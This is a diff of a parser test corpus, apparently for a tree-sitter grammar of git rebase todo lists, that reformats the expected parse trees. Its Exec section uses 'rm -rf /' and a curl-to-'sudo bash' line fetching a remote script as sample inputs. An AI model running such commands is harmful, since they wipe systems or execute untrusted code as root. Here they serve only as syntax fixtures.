@@ -1,6 +1,6 @@
-=======================================
+================================================================================
 Pick, reword, edit, squash, drop
-=======================================
+================================================================================
 
 pick 6017bf5 clean up sway config, add wofi-emoji
 p 6017bf5
@@ -13,23 +13,38 @@ s 7b6c8cf
 drop 7b6c8cf update unstable
 d a8f8aa0
 
----
+--------------------------------------------------------------------------------
 
 (source
-  (operation (commit) (comment))
-  (operation (commit))
-  (operation (commit) (comment))
-  (operation (commit))
-  (operation (commit) (comment))
-  (operation (commit))
-  (operation (commit) (comment))
-  (operation (commit))
-  (operation (commit) (comment))
-  (operation (commit)))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (commit))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (commit))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (commit))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (commit))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (commit)))
 
-=======================================
+================================================================================
 Fixup
-=======================================
+================================================================================
 
 fixup 3fb04ec add clipman for wl-clipboard history
 fixup -C 833c07a add gnome3.adwaita-icon-theme, fixing wofi lens/search icon
@@ -38,45 +53,60 @@ f 4f50bd5
 f -C 8e16698
 f -c 6017bf5
 
----
+--------------------------------------------------------------------------------
 
 (source
-  (operation (commit) (comment))
-  (operation (option) (commit) (comment))
-  (operation (option) (commit) (comment))
-  (operation (commit))
-  (operation (option) (commit))
-  (operation (option) (commit)))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (option)
+    (commit)
+    (comment))
+  (operation
+    (option)
+    (commit)
+    (comment))
+  (operation
+    (commit))
+  (operation
+    (option)
+    (commit))
+  (operation
+    (option)
+    (commit)))
 
-=======================================
+================================================================================
 Exec
-=======================================
+================================================================================
 
 exec rm -rf /
 x curl http://example.com/gotcha.sh | sudo bash
 
----
+--------------------------------------------------------------------------------
 
 (source
-  (operation (command))
-  (operation (command)))
+  (operation
+    (command))
+  (operation
+    (command)))
 
-=======================================
+================================================================================
 Break
-=======================================
+================================================================================
 
 break
 b
 
----
+--------------------------------------------------------------------------------
 
 (source
   (operation)
   (operation))
 
-=======================================
+================================================================================
 Label, reset
-=======================================
+================================================================================
 
 label v0.20.1
 l v0.20.1
@@ -86,19 +116,25 @@ t v0.20.0
 
 label v1.0.0 wohoo!
 
----
+--------------------------------------------------------------------------------
 
 (source
-  (operation (label))
-  (operation (label))
-  (operation (label))
-  (operation (label))
-  (operation (label))
-  (ERROR (UNEXPECTED 'w')))
+  (operation
+    (label))
+  (operation
+    (label))
+  (operation
+    (label))
+  (operation
+    (label))
+  (operation
+    (label))
+  (ERROR
+    (UNEXPECTED 'w')))
 
-=======================================
+================================================================================
 Merges
-=======================================
+================================================================================
 
 merge some-other-branch # Merge pull request #123 from some-other-branch
 merge some-other-branch
@@ -106,18 +142,31 @@ merge -C 3fb04ec some-other-branch # Merge pull request #123 from some-other-bra
 merge -C 3fb04ec some-other-branch
 merge -c 3fb04ec some-other-branch
 
----
+--------------------------------------------------------------------------------
 
 (source
-  (operation (label) (message))
-  (operation (label))
-  (operation (option) (commit) (label) (message))
-  (operation (option) (commit) (label))
-  (operation (option) (commit) (label)))
+  (operation
+    (label)
+    (message))
+  (operation
+    (label))
+  (operation
+    (option)
+    (commit)
+    (label)
+    (message))
+  (operation
+    (option)
+    (commit)
+    (label))
+  (operation
+    (option)
+    (commit)
+    (label)))
 
-=======================================
+================================================================================
 git rebase --interactive --rebase-merges
-=======================================
+================================================================================
 
 label onto
 
@@ -135,17 +184,33 @@ reset main-2 # add CET timezone to timezone section of waybar
 merge -C 3fb04ec some-other-branch # Merge pull request #123 from some-other-branch
 
 
----
+--------------------------------------------------------------------------------
 
 (source
-  (operation (label))
+  (operation
+    (label))
   (comment)
-  (operation (label))
-  (operation (commit) (comment))
-  (operation (label))
+  (operation
+    (label))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (label))
   (comment)
-  (operation (label) (comment))
-  (operation (commit) (comment))
-  (operation (label))
-  (operation (label) (comment))
-  (operation (option) (commit) (label) (message)))
+  (operation
+    (label)
+    (comment))
+  (operation
+    (commit)
+    (comment))
+  (operation
+    (label))
+  (operation
+    (label)
+    (comment))
+  (operation
+    (option)
+    (commit)
+    (label)
+    (message)))
